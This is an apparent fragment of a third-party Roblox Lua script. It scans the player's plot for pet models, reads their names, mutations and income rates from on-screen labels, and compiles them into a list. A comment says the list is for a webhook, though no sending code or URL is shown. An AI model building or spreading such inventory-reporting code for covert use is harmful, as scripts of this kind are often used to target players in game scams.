local function getMyPlot()
    local plotsFolder = workspace:FindFirstChild("Plots")
    if not plotsFolder then return nil end
    for _, plot in pairs(plotsFolder:GetChildren()) do
        local plotSign = plot:FindFirstChild("PlotSign")
        if plotSign then
            local yourBase = plotSign:FindFirstChild("YourBase")
            if yourBase and yourBase:IsA("BillboardGui") and yourBase.Enabled then
                return plot
            end
        end
    end
    return nil
end

local function getPartPosition(instance)
    if instance:IsA("BasePart") then return instance.Position end
    if instance.PrimaryPart then return instance.PrimaryPart.Position end
    local root = instance:FindFirstChild("RootPart") or instance:FindFirstChild("FakeRootPart") or instance:FindFirstChild("Handle")
    if root and root:IsA("BasePart") then return root.Position end
    for _, d in pairs(instance:GetDescendants()) do
        if d:IsA("BasePart") then return d.Position end
    end
    return nil
end

local function getAnimalFullData(animalModel, animalModelName)
    local debris = workspace:FindFirstChild("Debris")
    if not debris then return nil end
    local modelPos = getPartPosition(animalModel)
    if not modelPos then return nil end

    local animalInfo = AnimalsData and AnimalsData[animalModelName]
    local expectedName = (animalInfo and animalInfo.DisplayName) or animalModelName
    local cleanAnimal = string.gsub(string.lower(expectedName), "%s+", "")

    local bestData = nil
    local bestDist = math.huge

    for _, fastOverhead in pairs(debris:GetChildren()) do
        if fastOverhead.Name == "FastOverheadTemplate" then
            local overheadPos = getPartPosition(fastOverhead)
            if overheadPos then
                local dist = (overheadPos - modelPos).Magnitude
                if dist < bestDist then
                    local animalOverhead = fastOverhead:FindFirstChild("AnimalOverhead")
                    if animalOverhead then
                        local displayName = animalOverhead:FindFirstChild("DisplayName")
                        local generation = animalOverhead:FindFirstChild("Generation")
                        if displayName and displayName:IsA("TextLabel") then
                            local displayText = displayName.Text or ""
                            local cleanDisplay = string.gsub(string.lower(displayText), "%s+", "")
                            if string.find(cleanDisplay, cleanAnimal, 1, true) or string.find(cleanAnimal, cleanDisplay, 1, true) then
                                local genText = ""
                                if generation and generation:IsA("TextLabel") then
                                    genText = generation.Text or ""
                                end
                                bestDist = dist
                                bestData = {
                                    name = displayText ~= "" and displayText or expectedName,
                                    modelName = animalModelName,
                                    genText = genText
                                }
                                if dist < 5 then break end
                            end
                        end
                    end
                end
            end
        end
    end
    return bestData
end

-- Workspace'ten istenen türdeki pet'leri bulup webhook için veri toplar
local function scanWorkspaceForEmbed(filterType)
    local results = {}
    local plot = getMyPlot()
    if not plot then return results end

    local searchList = (filterType == "PRIORITY") and PRIORITY_BRAINROTS or UserAllowedAnimals
    for _, obj in pairs(plot:GetDescendants()) do
        local rawName = obj.Name
        local cleanName = rawName:gsub("%d+$", "")
        if obj:IsA("Model") and (searchList[rawName] or searchList[cleanName]) then
            local animalData = getAnimalFullData(obj, rawName)
            if animalData then
                local mutation = obj:GetAttribute("Mutation") or "None"
                if mutation == "" then mutation = "None" end
                local genVal = 0
                local cleanText = string.gsub(animalData.genText, ",", "")
                local num, suffix = string.match(cleanText, "%$([%d%.]+)([KMBT]?)/s")
                if num then
                    num = tonumber(num) or 0
                    if suffix == "K" then num = num * 1e3
                    elseif suffix == "M" then num = num * 1e6
                    elseif suffix == "B" then num = num * 1e9
                    elseif suffix == "T" then num = num * 1e12 end
                    genVal = num
                end
                local mutationPrefix = (mutation ~= "None" and mutation ~= "") and ("[" .. mutation .. "] ") or ""
                table.insert(results, {
                    index = animalData.modelName,
                    displayName = animalData.name,
                    name = "**" .. mutationPrefix .. animalData.name .. "**",
                    genVal = genVal,
                    genStr = animalData.genText ~= "" and animalData.genText or "$0/s",
                })
            end
        end
    end
    return results
end

